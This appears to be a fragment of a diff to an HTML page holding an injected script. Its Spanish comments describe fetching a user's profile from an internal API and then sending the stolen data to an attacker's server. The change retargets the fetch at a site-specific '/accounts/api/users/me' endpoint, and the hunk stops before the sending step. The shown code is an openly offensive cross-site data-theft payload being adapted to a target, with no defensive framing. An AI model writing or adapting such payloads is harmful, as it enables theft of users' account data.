@@ -11,7 +11,7 @@
 
   <script>
 // 1. Obtener los datos del perfil desde la API interna
-fetch('/api/v1/user/profile')
+fetch('/accounts/api/users/me')
   .then(response => response.json())
   .then(data => {
     // 2. Enviar los datos robados al servidor del atacante
